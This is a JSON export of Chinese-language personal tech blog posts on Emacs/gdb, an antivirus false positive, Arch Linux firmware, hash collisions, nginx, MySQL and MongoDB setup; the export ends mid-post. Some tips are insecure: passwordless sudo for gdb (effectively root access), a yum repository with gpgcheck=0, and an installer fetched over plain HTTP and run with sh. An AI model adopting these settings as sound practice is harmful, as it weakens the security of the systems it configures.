  "title": "\u5728emacs\u4e2d\u5982\u4f55\u4ee5root\u6743\u9650\u4f7f\u7528gdb\u8c03\u8bd5\u7a0b\u5e8f",
  "timestamp": "2013-03-30 14:21:00",
  "tags": [
    "emacs"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u7531\u4e8eM-x\u547d\u4ee4\u4e2d\u4f7f\u7528sudo\u8f93\u5165\u5bc6\u7801\u65e0\u6548\uff0c\u9700\u8981\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237sudo gdb\u514d\u5bc6\u7801\n<\/li>\n<\/ul>\n<pre class=\"example\">\nvisudo\n# Allow user to sudo gdb without password\n\u7528\u6237 ALL=NOPASSWD: \/usr\/bin\/gdb\n<\/pre>\n\n<ul class=\"org-ul\">\n<li>\u4f7f\u7528root\u6743\u9650\u542f\u52a8gdb\n<\/li>\n<\/ul>\n<pre class=\"example\">\nM-x gdb\nsudo gdb &lt;program&gt; &lt;pid&gt; --annotate=3\n<\/pre>\n"
},
{
  "title": "\u89e3\u51b3360\u6740\u6bd2\u62a5\u7f51\u9875HTML.Rce.Gen3\u6076\u610f\u7a0b\u5e8f\u7684\u95ee\u9898",
  "timestamp": "2012-08-01 08:55:00",
  "tags": [
    "web"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u95ee\u9898\u63cf\u8ff0<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u6d4b\u8bd5\u53d1\u73b0\u5728\u67d0\u4e9b\u673a\u5668\u4e0a\u4f1a\u5f39\u51fa360\u6740\u6bd2\u5371\u9669\u8b66\u544a\u5bf9\u8bdd\u6846\uff0c\u5bfc\u81f4\u7f51\u9875\u65e0\u6cd5\u6253\u5f00\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u89e3\u51b3\u65b9\u6cd5<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u5c06\u5d4c\u5165\u7684\u7edf\u8ba1js\u811a\u672c\u4ece&lt;\/html&gt;\u6807\u7b7e\u540e\u79fb\u5230\u91cc\u9762\u53bb\u3002\n<\/p>\n<ul class=\"org-ul\">\n<li>\u4fee\u6539\u524d\n<\/li>\n<\/ul>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-html\">...\n&lt;\/<span style=\"color: #f99157;\">body<\/span>&gt;\n&lt;\/<span style=\"color: #f99157;\">html<\/span>&gt;\n&lt;<span style=\"color: #f99157;\">script<\/span> <span style=\"color: #ffcc66;\">type<\/span>=<span style=\"color: #66cccc;\">\"text\/javascript\"<\/span>&gt;document.write(unescape(<span style=\"color: #66cccc;\">\"%3Cscript%20...%3C\/script%3E\"<\/span>));&lt;\/<span style=\"color: #f99157;\">script<\/span>&gt;\n<\/pre>\n<\/div>\n<ul class=\"org-ul\">\n<li>\u4fee\u6539\u540e\n<\/li>\n<\/ul>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-html\">...\n&lt;<span style=\"color: #f99157;\">script<\/span> <span style=\"color: #ffcc66;\">type<\/span>=<span style=\"color: #66cccc;\">\"text\/javascript\"<\/span>&gt;document.write(unescape(<span style=\"color: #66cccc;\">\"%3Cscript%20...%3C\/script%3E\"<\/span>));&lt;\/<span style=\"color: #f99157;\">script<\/span>&gt;\n&lt;\/<span style=\"color: #f99157;\">body<\/span>&gt;\n&lt;\/<span style=\"color: #f99157;\">html<\/span>&gt;\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5fc3\u5f97<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u4ee5\u540e\u518d\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u91c7\u53d6\u6392\u9664\u6cd5\uff0c\u5c06\u7f51\u9875\u53e6\u5b58\u4e3a\u672c\u5730\u6587\u4ef6\uff0c\u4e00\u70b9\u70b9\u7684\u5220\u9664\u5185\u5bb9\u76f4\u5230360\u6740\u6bd2\u4e0d\u518d\u62a5\u8b66\u4e3a\u6b62\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u89e3\u51b3Archlinux\u4e0bati\u663e\u53613D\u786c\u4ef6\u52a0\u901f\u5931\u6548\u7684\u95ee\u9898",
  "timestamp": "2012-09-05 23:52:00",
  "tags": [
    "archlinux"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u95ee\u9898\u63cf\u8ff0<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u75c7\u72b6\n\n<p>\n\u8fdb\u5165gnome3\u684c\u9762\u73af\u5883\u540e\u5f88\u5361\uff0c\u4e0d\u52a8\u8fd8\u597d\uff0c\u4e00\u52a8gnome-shell\u8fdb\u7a0bcpu\u5360\u7528\u5c31\u76f4\u5954100%\u3002\n<\/p>\n<\/li>\n\n<li>dmesg\u5f02\u5e38\u65e5\u5fd7\n<pre class=\"example\">\nradeon_cp: Failed to load firmware \"radeon\/R520_cp.bin\"\nradeon 0000:01:00.0: failed initializing CP (-2).\nradeon 0000:01:00.0: Disabling GPU acceleration\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u89e3\u51b3\u529e\u6cd5<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo ln -s \/usr\/lib\/firmware \/lib\/\nsudo reboot\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u7ecf\u9a8c\u603b\u7ed3<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u51fa\u73b0\u95ee\u9898\u65f6\u7f51\u4e0a\u4e0d\u4e00\u5b9a\u80fd\u627e\u5230\u4f60\u8981\u7684\u7b54\u6848\uff0c\u50cf\u8fd9\u4e2a\u95ee\u9898\uff0c\u7f51\u4e0a\u7684\u8bba\u575b\u91cc\u6709\u65e0\u6570\u4e2a\u5efa\u8bae\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bd5\u4e0b\u53bb\u5176\u5b9e\u5f88\u6d6a\u8d39\u65f6\u95f4\uff0c\n\u8bd5\u51e0\u6b21\u4e4b\u540e\u8fd8\u6ca1\u80fd\u89e3\u51b3\u5c31\u5e94\u8be5\u5c1d\u8bd5\u4e3b\u52a8\u5206\u6790\u89e3\u51b3\uff0c\u50cf\u8fd9\u91cc\u7a0d\u5fae\u7559\u610f\u5230\u62ec\u53f7\u91cc\u7684-2\uff0c\u5c31\u80fd\u53d1\u73b0\u5176\u5b9e\u5b83\u662f\u4e2a\u9519\u8bef\u7801\uff0c\nperror\u4e00\u4e0b\u5c31\u77e5\u9053\u610f\u601d\u662f\u201c\u627e\u4e0d\u5230\u6587\u4ef6\u6216\u76ee\u5f55\u201d\uff0c\u8054\u60f3\u5230\u6700\u8fd1\u51e0\u6b21\u5347\u7ea7archlinux\u5728\u628a\/lib\u91cc\u7684\u4e1c\u897f\u5f80\/usr\/lib\u4e0b\u79fb\uff0c\n\u5176\u4e2d\u5c31\u5305\u62ecfiremware\uff0c\u8fd9\u6837\u624b\u5de5\u5728\u65e7\u7684firmware\u4f4d\u7f6e\u5efa\u4e00\u4e2a\u8f6f\u94fe\u63a5\u5c31\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u5907\u6ce8<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u8fd9\u4e2a\u95ee\u9898\u5e94\u8be5\u662f\u7531\u4e8e\u4e4b\u524dglibc\u5347\u7ea7\u65f6\u672a\u5168\u90e8\u5b8c\u6210\u5f15\u8d77\u7684\uff0carchlinux\u73b0\u5728\u628a\/lib\u6539\u4e3a\/usr\/lib\u7684\u8f6f\u94fe\u63a5\u4e86\uff0c\u53ef\u4ee5\u624b\u5de5\u8fdb\u884c\u8bbe\u7f6e\u4e3a\u8f6f\u94fe\u63a5\u8fd9\u4e00\u6b65\u9aa4\u6765\u4fee\u590d\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "Fnv\u7b97\u6cd5\u51b2\u7a81\u7387\u6d4b\u8bd5",
  "timestamp": "2012-11-24 18:31:00",
  "tags": [
    "hash"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"http:\/\/www.isthe.com\/chongo\/tech\/comp\/fnv\/\">Fnv<\/a>\u4ecb\u7ecd<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\nFnv\u662f\u548c <a href=\"http:\/\/code.google.com\/p\/cityhash\/\">CityHash<\/a> \u7c7b\u4f3c\u7684\u54c8\u5e0c\u7b97\u6cd5\u3002\u8fd9\u91cc\u91cd\u590d\u300a<a href=\"http:\/\/blog.kankanan.com\/posts\/2012\/11\/24_cityhash7b976cd551b27a8173876d4b8bd5.html\">CityHash\u7b97\u6cd5\u51b2\u7a81\u7387\u6d4b\u8bd5<\/a>\u300b\uff0c\u505a\u4e3a\u4e00\u4e2a\u5bf9\u6bd4\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u6d4b\u8bd5\u6837\u672c\u6570\u636e<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n16630591\u884c\u4e0d\u91cd\u590d\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e00\u884c\u5185\u5bb9\u4e3a\u4ee5\u5236\u8868\u7b26\u5206\u9694\u7684\u4e0b\u8f7d\u5730\u5740\u548c\u5f15\u7528\u9875\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">fnv64\u6d4b\u8bd5\u7ed3\u679c<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u6ca1\u6709\u51b2\u7a81\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">fnv32\u6d4b\u8bd5\u7ed3\u679c<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u517131948\u6b21\u51b2\u7a81\uff0c\u51b2\u7a81\u7387\u7ea6\u4e3a\u5343\u5206\u4e4b\u4e8c\u3002\n\u540c\u4e00\u54c8\u5e0c\u503c\u4e0a33\u6b21\u51b2\u7a81\u4e8c\u6b21\uff0c31879\u6b21\u51b2\u7a81\u4e00\u6b21\u3002\n\u51b2\u7a81\u7387\u6bd4CityHash\u7565\u4f4e\uff0c\u5c11\u4e86298\u6b21\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5982\u4f55\u505a\u9762\u8bd5",
  "timestamp": "2012-10-24 14:23:00",
  "tags": null,
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u8bed\u8a00\u57fa\u7840<\/h2>\n<\/div>\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u76f8\u5173\u6280\u672f<\/h2>\n<\/div>\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u6027\u80fd\u4f18\u5316<\/h2>\n<\/div>\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u67b6\u6784<\/h2>\n<\/div>\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u7ba1\u7406<\/h2>\n<\/div>\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">\u8bc9\u6c42<\/h2>\n<\/div>\n"
},
{
  "title": "\u7406\u89e3nginx\u7684keepalive_timeout\u914d\u7f6e\u9879",
  "timestamp": "2012-11-12 17:05:00",
  "tags": [
    "nginx",
    "http"
  ],
  "body": "<p>\n\u4e0d\u8981\u8bef\u4ee5\u4e3a\u5b83\u662f\u6307tcp\u8fde\u63a5\u7a7a\u95f2\u591a\u5c11\u79d2\u540e\u5173\u95ed\uff0c\u5b83\u4ec5\u8868\u793a\u8fde\u63a5\u5efa\u7acb\u591a\u5c11\u79d2\u540e\u5173\u95ed\uff0c\u4e0d\u4f1a\u5728\u4e00\u6b21\u8bf7\u6c42\u540e\u91cd\u65b0\u8ba1\u65f6\u3002<\/p>\n"
},
{
  "title": "\u5728python\u4e2d\u5b89\u88c5mysqldb\u6a21\u5757",
  "timestamp": "2012-08-01 08:55:00",
  "tags": [
    "python"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u6b63\u5e38\u7684\u5b89\u88c5\u8fc7\u7a0b<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"background-color: #515151;\"> <\/span> wget <span style=\"color: #66cccc;\">\"http:\/\/downloads.sourceforge.net\/project\/mysql-python\/mysql-python\\<\/span>\n<span style=\"color: #66cccc;\">\/1.2.3\/MySQL-python-1.2.3.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects\\<\/span>\n<span style=\"color: #66cccc;\">%2Fmysql-python%2Ffiles%2F&amp;ts=1304062611&amp;use_mirror=nchc\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span> tar xzvf MySQL-python-1.2.3.tar.gz\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #cc99cc;\">cd<\/span> MySQL-python-1.2.3\n<span style=\"background-color: #515151;\"> <\/span> python setup.py build\n<span style=\"background-color: #515151;\"> <\/span> python setup.py install\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5e38\u89c1\u9519\u8bef\u53ca\u5176\u4fee\u590d<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>ImportError: No module named setuptools\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\" id=\"install-setuptools\">wget http:\/\/pypi.python.org\/packages\/2.4\/s\/setuptools\/setuptools-0.6c11-py2.4.eg<span style=\"text-decoration: underline;\">g<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\\<\/span>\n<span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">md5=bd639f9b0eac4c42497034dec2ec0c2b<\/span>\nsh setuptools-0.6c11-py2.4.egg\n<\/pre>\n<\/div>\n<\/li>\n\n<li>mysql_config: command not found\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\" id=\"edit-site.cfg\">sed --in-place -e <span style=\"color: #66cccc;\">\"s\/#mysql_config = \\\/usr\\\/local\\\/bin\\\/mysql_config\/\\<\/span>\n<span style=\"color: #66cccc;\">mysql_config = \\\/usr\\\/local\\\/mysql\\\/bin\\\/mysql_config\/g\"<\/span> site.cfg\n<\/pre>\n<\/div>\n<\/li>\n\n<li>ImportError: &hellip; _mysql.so: undefined symbol: compress\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\" id=\"edit-setup_posix.py\">sed --in-place -e <span style=\"color: #66cccc;\">\"s\/libs = mysql_config(\\\"libs_r\\\")\/libs = mysql_config(\\\"libs_<\/span><span style=\"color: #66cccc; text-decoration: underline;\">r\\\")\\n\\<\/span>\n<span style=\"color: #66cccc;\">libs.append('-lz')\\n        print libs\/g\"<\/span> setup_posix.py\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5982\u4f55\u5b66\u4e60\u82f1\u8bed",
  "timestamp": "2013-04-07 09:49:00",
  "tags": [
    "english"
  ],
  "body": "<p>\n\u7ecf\u8fc7\u4e00\u5929\u7684\u82f1\u5b5a\u53ca\u97e6\u535a\u8bd5\u542c\uff0c\u603b\u7ed3\u51fa\u4ee5\u4e0b\u51e0\u70b9\uff1a\n<\/p>\n<dl class=\"org-dl\">\n<dt> \u8bed\u6cd5 <\/dt><dd>    \u719f\u8bfb\u5e38\u7528\u53e5\u578b\uff0c\u6269\u5c55\u81f3\u7c7b\u4f3c\u8bed\u53e5\uff0c\u4ece\u4e2d\u63d0\u70bc\u8bed\u6cd5\uff0c\u53e6\u4e00\u65b9\u9762\u4e5f\u53ef\u4ee5\u7ec3\u5c31\u4e00\u53e3\u6d41\u5229\u7684\u65e5\u7528\u53e3\u8bed\u3002\n<\/dd>\n<dt> \u542c\u529b <\/dt><dd>    \u4e0d\u4f1a\u8bf4\u5c31\u4e0d\u4f1a\u542c\uff0c\u591a\u8bf4\u624d\u80fd\u591f\u5feb\u901f\u8bc6\u522b\u542c\u5230\u7684\u4e1c\u897f\u3002\n<\/dd>\n<dt> \u9605\u8bfb <\/dt><dd>    \u591a\u8bb0\u5355\u8bcd\uff0c\u4e0d\u65ad\u7684\u91cd\u590d\u91cd\u590d\u518d\u91cd\u590d\uff0c\u76f4\u5230\u770b\u5230\u5355\u8bcd\u8131\u53e3\u800c\u51fa\u3002\n<\/dd>\n<\/dl>\n"
},
{
  "title": "MongoDB\u57fa\u7840",
  "timestamp": "2012-10-21 17:06:00",
  "tags": [
    "mongodb"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">MongoDB\u4e0eMysql\u7684\u57fa\u672c\u7ed3\u6784\u5bf9\u5e94\u5173\u7cfb<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<\/div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">\u4e00\u53f0\u673a\u5668<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\ncomputer\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-1-1-1\" class=\"outline-4\">\n<h4 id=\"sec-1-1-1\">\u591a\u4e2aMongoDB\u5b9e\u4f8b                                          &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                    mysql\u670d\u52a1\u5668\u8fdb\u7a0b<\/h4>\n<div class=\"outline-text-4\" id=\"text-1-1-1\">\n<p>\nMongoDB Instance                                        &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                    Mysqld Instance\n<\/p>\n\n<p>\n\u8fd0\u884c\u7740\u7684MongoDB\u540e\u53f0\u670d\u52a1\u8fdb\u7a0b\uff1a\/etc\/rc.d\/mongodb start      &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                     \/etc\/rc.d\/mysqld start\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-1-1-1-1\" class=\"outline-5\">\n<h5 id=\"sec-1-1-1-1\">\u591a\u4e2a\u6570\u636e\u5e93                                              &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                    mysql\u4e2d\u7684\u6570\u636e\u5e93<\/h5>\n<div class=\"outline-text-5\" id=\"text-1-1-1-1\">\n<p>\nMongoDB Database                                       &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                     Database\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-1-1-1-1-1\" class=\"outline-6\">\n<h6 id=\"sec-1-1-1-1-1\">\u591a\u4e2a\u96c6\u5408                                               &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                    mysql\u4e2d\u7684\u8868<\/h6>\n<div class=\"outline-text-6\" id=\"text-1-1-1-1-1\">\n<p>\nMongoDB Collection                                    &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                     Table\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-1-1-1-1-1-1\" class=\"outline-7\">\n<h7 id=\"sec-1-1-1-1-1-1\">\u591a\u4e2a\u6587\u6863                                             &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                     mysql\u4e2d\u7684\u8bb0\u5f55\u884c<\/h7>\n<div class=\"outline-text-7\" id=\"text-1-1-1-1-1-1\">\n<p>\nMongoDB Document                                     &lt;&#x2013;\u5bf9\u5e94&#x2013;&gt;                    Row\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">CentOS\u4e0a\u642d\u5efa\u73af\u5883<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<dl class=\"org-dl\">\n<dt> \u6dfb\u52a0\u6e90\/etc\/yum.repos.d\/10gen.repo <\/dt><dd><pre class=\"example\">\n[10gen]\nname=10gen Repository\nbaseurl=http:\/\/downloads-distro.mongodb.org\/repo\/redhat\/os\/x86_64\ngpgcheck=0\n<\/pre>\n<\/dd>\n<dt> \u5b89\u88c5\u670d\u52a1\u5668\u5ba2\u6237\u7aef\u7a0b\u5e8f <\/dt><dd><div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum install mongo-10gen mongo-10gen-server\n<\/pre>\n<\/div>\n<\/dd>\n<dt> \u5b89\u88c5php\u6269\u5c55 <\/dt><dd><div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum -y install make gcc php-devel\nyum install php-pear\n<span style=\"color: #ffcc66;\">PATH<\/span>=$<span style=\"color: #ffcc66;\">PATH<\/span>:\/usr\/local\/php\/bin\/ pecl install mongo\n<\/pre>\n<\/div>\n<p>\nphp.ini\u4e2d\u6dfb\u52a0\uff1aextension=mongo.so\n<\/p>\n<\/dd>\n<dt> \u542f\u52a8\u670d\u52a1 <\/dt><dd>     \/etc\/rc.d\/init.d\/mongodb start\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u89e3\u51b3mysql_connect\u6162\u7684\u95ee\u9898",
  "timestamp": "2012-12-06 10:25:00",
  "tags": [
    "mysql"
  ],
  "body": "<p>\n\u538b\u6d4b\u65f6\u53d1\u73b0mysql_connect\u8017\u65f6\u8d85\u8fc730\u79d2\uff0c\u767b\u5f55mysql\u540e\u6267\u884cshow processlist\uff0c\u663e\u793a\u8d85\u8fc7800\u4e2a\u8fde\u63a5\u72b6\u6001\u5982\u4e0b\uff1a\n<\/p>\n\n<pre class=\"example\">\nunauthenticated user | XXXX.XXX.XXX.XXX:XXXX  | NULL | Connect     |  NULL | login\n<\/pre>\n\n<p>\n\u7ecf\u6c42\u6559\u8fd0\u7ef4\uff0c\u5728my.cnf\u4e2d\u7684\u201c[mysqld]\u201d\u4e0b\u6dfb\u52a0\u4ee5\u4e0b\u914d\u7f6e\u884c\u5373\u53ef\uff1a\n<\/p>\n\n<pre class=\"example\">\nskip-name-resolve\n<\/pre>\n"
},
{
  "title": "Nginx Comet: \u57fa\u4e8e HTTP \u957f\u8fde\u63a5\u7684\u201c\u670d\u52a1\u5668\u63a8\u201d\u6280\u672f",
  "timestamp": "2012-12-14 21:09:00",
  "tags": [
    "nginx",
    "comet"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7b80\u4ecb<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u53ef\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1a<a href=\"http:\/\/www.ibm.com\/developerworks\/cn\/web\/wa-lo-comet\/\">Comet\uff1a\u57fa\u4e8e HTTP \u957f\u8fde\u63a5\u7684\u201c\u670d\u52a1\u5668\u63a8\u201d\u6280\u672f<\/a>\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https:\/\/github.com\/slact\/nginx_http_push_module\">nginx_http_push_module<\/a> \uff08\u4e0d\u5efa\u8bae\u4f7f\u7528\uff09<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u8fd9\u4e2a\u6a21\u5757\u529f\u80fd\u4e0a\u6ca1\u6709\u95ee\u9898\uff0c\u7f51\u4e0a\u4ecb\u7ecd\u7684\u6587\u7ae0\u76f8\u5bf9\u6bd4\u8f83\u591a\uff0c\u4f46\u662f\u5b58\u5728\u4e25\u91cd\u7684\u5185\u5b58\u6cc4\u9732\u95ee\u9898\uff0c\u800c\u4e14\u53d1\u73b0\u4f7f\u7528kill -HUP\u7684\u65b9\u5f0f\u4f18\u96c5\u91cd\u542fnginx\u867d\u4f1a\u91ca\u653e\u4e00\u90e8\u5206\u5185\u5b58\uff0c\u4f46nginx\u9519\u8bef\u65e5\u5fd7\u663e\u793a\u6709\u5171\u4eab\u5185\u5b58\u9501\u76f8\u5173\u7684\u51b2\u7a81\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u6bcf\u5c0f\u65f6\u5f7b\u5e95\u91cd\u542f\u4e00\u6b21nginx\u3002\u7b80\u5355\u8bf4\u4e00\u4e0b\u5c31\u662f\u5b83\u4f7f\u7528\u4e00\u4e2a\u5168\u5c40\u7684\u5185\u5b58\u6c60\u6765\u5206\u914d\u8ba2\u9605\u8005\u53ca\u54cd\u5e94\u9700\u8981\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u662f\u4ecenginx\u5185\u5b58\u6c60\u5206\u914d\u7684\u5c0f\u5185\u5b58\u5757\uff08&lt; pagesize\uff0c4096\uff09\u662f\u4e0d\u4f1a\u91ca\u653e\u7684\u4e5f\u4e0d\u4f1a\u5f52\u8fd8\u5230\u6c60\u4e2d\u8fdb\u884c\u91cd\u7528\uff0c\u5177\u4f53\u53ef\u67e5\u770bnginx\u6e90\u7801\u7684ngx_palloc\u548cngx_pfree\u51fd\u6570\u8fdb\u884c\u9a8c\u8bc1\u3002\n<\/p>\n\n<p>\n\u53efgoogle \"nginx\u4e2dmod_push\u6a21\u5757\u5185\u5b58\u5206\u914d\u6539\u9020\"\uff0c\u5728\u4f5c\u8005\u7684<a href=\"http:\/\/http:\/\/blog.lifeibo.com\/\">\u7f51\u7ad9<\/a>\u6b63\u5728\u6539\u7248\u6682\u65f6\u627e\u4e0d\u5230\u8be5\u6587\u7ae0\u3002\n<\/p>\n\n<p>\n<a href=\"http:\/\/bsd.ee\/~hadara\/blog\/?p=215=1\">\u8fd9\u91cc<\/a>\u4e5f\u6709\u4eba<a href=\"https:\/\/github.com\/slact\/nginx_http_push_module\/pull\/60\">\u6307\u51fa<\/a>\u8be5\u95ee\u9898\uff0c\u540c\u65f6\u8be5\u6587\u4f5c\u8005\u4e5ffork\u4e86\u4e00\u4e2a\u5206\u679d\uff0c\u4f46\u662f\u6211\u8bd5\u4e86\u4e00\u4e0b\uff0c\u9664\u4e86\u4e0d\u652f\u6301push_channel_timeout\u7279\u6027\u5916\uff0c\u8fd8\u662f\u4e00\u6837\u6709\u5185\u5b58\u6cc4\u9732\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> \u53c2\u8003\u914d\u7f6e <\/dt><dd><\/dd>\n<\/dl>\n<pre class=\"example\">\nlocation ~ ^\/publish$ {\n    allow 127.0.0.1;\n    deny all;\n    set $push_channel_id $arg_id;\n    push_publisher;\n    push_delete_oldest_received_message on;\n    push_message_timeout 5s;\n    #push_channel_timeout 60s;\n    push_store_messages off;\n}\n\nlocation ~ ^\/activity$ {\n    if ($args ~ \"callback=(.+)\" ) {\n        rewrite ^\/activity \"\/activity_jsonp\" last;\n    }\n    push_subscriber;\n    push_subscriber_timeout 60s;\n    push_subscriber_concurrency first;\n    push_max_channel_subscribers 1;\n    set $push_channel_id $arg_id;\n    default_type application\/json;\n}\n\nlocation ~ ^\/activity_jsonp$ {\n    push_subscriber;\n    push_subscriber_timeout 60s;\n    push_subscriber_concurrency first;\n    push_max_channel_subscribers 1;\n    set $push_channel_id $arg_id;\n    default_type application\/json;\n    echo_before_body $arg_callback \"(\";\n    echo_after_body \")\";\n}\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\"><a href=\"https:\/\/github.com\/wandenberg\/nginx-push-stream-module\">nginx-push-stream-module<\/a> \uff08\u5efa\u8bae\u4f7f\u7528\uff09<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u7531\u4e8e <a href=\"https:\/\/github.com\/slact\/nginx_http_push_module\">nginx_http_push_module<\/a> \u5b58\u5728\u5185\u5b58\u6cc4\u9732\u95ee\u9898\uff0c\u540c\u65f6\u6ca1\u6709\u4eba\u8fdb\u884c\u6b63\u5f0f\u7684\u4fee\u590d\uff0c\u6211\u4eec\u51b3\u5b9a\u5c1d\u8bd5\u4e00\u4e0b<a href=\"https:\/\/github.com\/wandenberg\/nginx-push-stream-module\">nginx-push-stream-module<\/a>\uff0c\u8fd9\u4e2a\u6a21\u5757\u529f\u80fd\u66f4\u5f3a\u5927\u540c\u65f6\u6587\u6863\u66f4\u5b8c\u6574\uff0c\u770b\u8d77\u6765\u4e5f\u66f4\u6d3b\u8dc3\u3002\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> \u4f18\u70b9 <\/dt><dd><ul 